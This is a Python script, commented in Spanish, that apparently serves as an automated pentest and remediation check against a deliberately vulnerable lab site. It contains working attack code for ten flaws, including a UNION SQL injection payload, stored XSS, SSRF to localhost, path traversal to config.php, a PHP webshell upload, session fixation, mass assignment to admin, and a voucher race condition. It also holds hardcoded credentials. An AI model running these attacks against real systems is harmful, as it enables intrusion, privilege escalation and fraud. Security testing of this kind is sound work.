#!/usr/bin/env python3
"""
Weather Report Solutions S.L. — Suite Automatizada de Verificación Ofensiva y Defensiva
Auditoría y Validación Científica de las 10 Vulnerabilidades Reales (WR-RT-01 a WR-RT-10)
OWASP WSTG v4.2 & PTES Execution Framework
"""

import sys
import os
import time
import json
import concurrent.futures
import requests

TARGET = os.getenv("TARGET_URL", "https://weatherreport.breakerxfixer.online").rstrip("/")
TIMEOUT = 10

def banner():
    print("=" * 75)
    print(" WEATHER REPORT SOLUTIONS S.L. — AUDITORÍA AUTOMATIZADA DE CIBERSEGURIDAD")
    print(f" Target: {TARGET}")
    print(" Metodología: OWASP WSTG v4.2 / PTES")
    print("=" * 75)

def get_session(username="cargo_user", password="CargoPass123!"):
    s = requests.Session()
    login_url = f"{TARGET}/login.php"
    r = s.post(login_url, data={"username": username, "password": password}, timeout=TIMEOUT, verify=False)
    if "dashboard.php" in r.url or "Cerrar Sesión" in r.text or "Dashboard" in r.text:
        return s
    return None

def test_wr_rt_01_idor():
    print("\n[+] WR-RT-01: Broken Access Control / IDOR Avanzado en Informes")
    # Autenticarse como cargo_user (Empresa 3)
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error: No se pudo autenticar con cargo_user.")
        return False
    # Intentar descargar informe 1 (AgroTech - Empresa 1)
    res = s.get(f"{TARGET}/api/v1/download_report.php?report_id=1", timeout=TIMEOUT, verify=False)
    if "AgroTech Logistics" in res.text or "1.420.000,00 EUR" in res.text:
        print("  [!] VULNERABILIDAD CONFIRMADA: Usuario de Empresa 3 accede a informe clasificado de Empresa 1.")
        return True
    elif res.status_code == 403:
        print("  [*] REMEDIADO (Blue Team): Servidor responde 403 Forbidden.")
        return False
    else:
        print(f"  [-] Respuesta inesperada: HTTP {res.status_code}")
        return False

def test_wr_rt_02_business_logic():
    print("\n[+] WR-RT-02: Business Logic Abuse en Suscripción y Cuotas")
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error: No se pudo autenticar.")
        return False
    payload = {"plan": "Enterprise VIP SLA", "coupon_code": "WR-FREE-PASS-2026", "seats": 10}
    res = s.post(f"{TARGET}/api/v1/upgrade_subscription.php", json=payload, timeout=TIMEOUT, verify=False)
    try:
        data = res.json()
        if data.get("status") == "success" and "COMPLETED_VIA_PROMO" in str(data):
            print("  [!] VULNERABILIDAD CONFIRMADA: Plan actualizado a Enterprise VIP sin pasarela de pago.")
            return True
        elif res.status_code == 400 or res.status_code == 402:
            print("  [*] REMEDIADO (Blue Team): Cupón no válido rechazado por el servidor.")
            return False
    except Exception as e:
        print(f"  [-] Error parseando respuesta: {e}")
    return False

def test_wr_rt_03_sqli():
    print("\n[+] WR-RT-03: SQL Injection (UNION / Extraction) en Telemetría")
    payload = "MADRID' UNION SELECT 999,'ST-PWN','EXFILTRATED_TEST_CITY',99.9,100,'PWNED',150.0,1000,50.0,NOW()-- -"
    url = f"{TARGET}/api/v1/weather.php?city=" + requests.utils.quote(payload)
    res = requests.get(url, timeout=TIMEOUT, verify=False)
    if "EXFILTRATED_TEST_CITY" in res.text or "PWNED" in res.text:
        print("  [!] VULNERABILIDAD CONFIRMADA: Inyección UNION ejecutada exitosamente.")
        return True
    elif "data" in res.text and "EXFILTRATED_TEST_CITY" not in res.text:
        print("  [*] REMEDIADO (Blue Team): Consulta parametrizada. No inyectable.")
        return False
    return False

def test_wr_rt_04_stored_xss():
    print("\n[+] WR-RT-04: Stored Cross-Site Scripting en Feedback / Soporte")
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error de sesión.")
        return False
    xss_payload = "<script id='xss_proof'>/*WR-RT-04-VERIFIED*/</script>"
    s.post(f"{TARGET}/feedback.php", data={"username": "AuditUser", "email": "test@test.local", "comment": f"Report SLA {xss_payload}", "rating": 5}, timeout=TIMEOUT, verify=False)
    # Verificar si el payload se refleja sin escapar
    res = s.get(f"{TARGET}/feedback.php", timeout=TIMEOUT, verify=False)
    if xss_payload in res.text:
        print("  [!] VULNERABILIDAD CONFIRMADA: Script reflejado en el DOM sin codificación HTML.")
        return True
    elif "&lt;script" in res.text:
        print("  [*] REMEDIADO (Blue Team): Entidades HTML codificadas con htmlspecialchars().")
        return False
    return False

def test_wr_rt_05_ssrf():
    print("\n[+] WR-RT-05: Server-Side Request Forgery (SSRF) en Webhook Tester")
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error de sesión.")
        return False
    # Probar endpoint local / interno
    test_url = f"{TARGET}/tools/webhook.php?url=http://127.0.0.1:8080/"
    res = s.get(test_url, timeout=TIMEOUT, verify=False)
    if "Apache" in res.text or "Weather Report" in res.text or "resultado" in res.text.lower():
        print("  [!] VULNERABILIDAD CONFIRMADA: Petición interna ejecutada desde el servidor.")
        return True
    elif "prohibida" in res.text.lower() or "400" in str(res.status_code):
        print("  [*] REMEDIADO (Blue Team): IP privada bloqueada por filtro de destinos.")
        return False
    return False

def test_wr_rt_06_path_traversal():
    print("\n[+] WR-RT-06: Path Traversal / Arbitrary File Read en Exportación")
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error de sesión.")
        return False
    # Intentar leer config.php
    res = s.get(f"{TARGET}/api/v1/raw_telemetry_export.php?file=../config.php", timeout=TIMEOUT, verify=False)
    if "DB_NAME" in res.text or "AWS_SECRET_KEY" in res.text or "PDO" in res.text:
        print("  [!] VULNERABILIDAD CONFIRMADA: Lectura arbitraria de archivo confidencial config.php.")
        return True
    elif res.status_code in [400, 403, 404]:
        print("  [*] REMEDIADO (Blue Team): Path traversal neutralizado con basename/realpath.")
        return False
    return False

def test_wr_rt_07_mass_assignment():
    print("\n[+] WR-RT-07: Mass Assignment en API de Perfil")
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error de sesión.")
        return False
    payload = {"full_name": "Audit Operator", "role": "admin"}
    res = s.post(f"{TARGET}/api/v1/update_profile.php", json=payload, timeout=TIMEOUT, verify=False)
    try:
        data = res.json()
        if data.get("status") == "success" and data.get("user", {}).get("role") == "admin":
            print("  [!] VULNERABILIDAD CONFIRMADA: Rol administrativo asignado por deserialización masiva.")
            return True
        elif data.get("user", {}).get("role") != "admin":
            print("  [*] REMEDIADO (Blue Team): Propiedad 'role' ignorada por lista blanca.")
            return False
    except Exception as e:
        print(f"  [-] Error parseando respuesta: {e}")
    return False

def test_wr_rt_08_session_fixation():
    print("\n[+] WR-RT-08: Gestión Insegura de Sesiones / Session Fixation")
    forced_token = "WR-AUDIT-FIXED-SESSION-TOKEN-2026"
    s1 = requests.Session()
    # 1. Atacante envía URL con sid
    s1.get(f"{TARGET}/login.php?sid={forced_token}", timeout=TIMEOUT, verify=False)
    # 2. Víctima hace login
    s1.post(f"{TARGET}/login.php", data={"username": "admin", "password": "AdminWeather2026!"}, timeout=TIMEOUT, verify=False)
    # 3. Atacante usa la misma cookie en otra sesión
    s2 = requests.Session()
    s2.cookies.set("PHPSESSID", forced_token)
    r2 = s2.get(f"{TARGET}/dashboard.php", timeout=TIMEOUT, verify=False)
    if "Alejandro De Luque" in r2.text or "Panel de Control" in r2.text or "Cerrar Sesión" in r2.text:
        print("  [!] VULNERABILIDAD CONFIRMADA: Sesión secuestrada mediante identificador prefijado.")
        return True
    else:
        print("  [*] REMEDIADO (Blue Team): session_regenerate_id() invalidó el token previo.")
        return False

def test_wr_rt_09_file_upload():
    print("\n[+] WR-RT-09: Insecure File Upload (WebShell RCE)")
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error de sesión.")
        return False
    shell_content = "<?php echo 'WR_RCE_TEST_SUCCESS'; ?>"
    files = {"fileToUpload": ("probe_audit.php", shell_content, "image/jpeg")}
    r_up = s.post(f"{TARGET}/profile/upload_avatar.php", files=files, timeout=TIMEOUT, verify=False)
    # Verificar ejecución
    r_exec = requests.get(f"{TARGET}/uploads/probe_audit.php", timeout=TIMEOUT, verify=False)
    if "WR_RCE_TEST_SUCCESS" in r_exec.text:
        print("  [!] VULNERABILIDAD CONFIRMADA: Código PHP ejecutado desde /uploads/.")
        return True
    elif r_exec.status_code in [403, 404] or "WR_RCE_TEST_SUCCESS" not in r_exec.text:
        print("  [*] REMEDIADO (Blue Team): Ejecución bloqueada o extensión rechazada.")
        return False
    return False

def test_wr_rt_10_race_condition():
    print("\n[+] WR-RT-10: Race Condition / TOCTOU en Canje de Vouchers")
    voucher_code = "TURBO-RADAR-250"
    s = get_session("cargo_user", "CargoPass123!")
    if not s:
        print("  [-] Error de sesión.")
        return False
    
    # Restablecer estado de vouchers para asegurar repetibilidad
    try:
        s.post(f"{TARGET}/api/v1/redeem_voucher.php?reset=1", timeout=TIMEOUT, verify=False)
    except Exception:
        pass

    def redeem():
        sess = requests.Session()
        for c in s.cookies:
            sess.cookies.set(c.name, c.value)
        return sess.post(f"{TARGET}/api/v1/redeem_voucher.php", json={"voucher_code": voucher_code}, timeout=TIMEOUT, verify=False)

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(redeem) for _ in range(8)]
        results = [f.result() for f in futures]

    success_count = 0
    for r in results:
        try:
            if r.json().get("status") == "success":
                success_count += 1
        except:
            pass

    print(f"  [*] Concurrencia completada: {success_count} de 8 peticiones canjearon el voucher.")
    if success_count > 1:
        print("  [!] VULNERABILIDAD CONFIRMADA: El cupón fue canjeado múltiples veces por TOCTOU.")
        return True
    elif success_count == 1:
        print("  [*] REMEDIADO (Blue Team): Operación atómica; solo una petición tuvo éxito.")
        return False
    else:
        print("  [-] Cupón ya había sido canjeado previamente.")
        return False

def main():
    banner()
    tests = [
        ("WR-RT-01", test_wr_rt_01_idor),
        ("WR-RT-02", test_wr_rt_02_business_logic),
        ("WR-RT-03", test_wr_rt_03_sqli),
        ("WR-RT-04", test_wr_rt_04_stored_xss),
        ("WR-RT-05", test_wr_rt_05_ssrf),
        ("WR-RT-06", test_wr_rt_06_path_traversal),
        ("WR-RT-07", test_wr_rt_07_mass_assignment),
        ("WR-RT-08", test_wr_rt_08_session_fixation),
        ("WR-RT-09", test_wr_rt_09_file_upload),
        ("WR-RT-10", test_wr_rt_10_race_condition),
    ]

    results = {}
    for tid, fn in tests:
        try:
            results[tid] = fn()
        except Exception as e:
            print(f"  [-] Error ejecutando prueba {tid}: {e}")
            results[tid] = False

    print("\n" + "=" * 75)
    print(" RESUMEN DE EJECUCIÓN")
    print("=" * 75)
    for tid, status in results.items():
        state = "VULNERABLE (ÉXITO PENTEST)" if status else "SEGURO / REMEDIADO"
        print(f" {tid}: {state}")
    print("=" * 75)

if __name__ == "__main__":
    main()
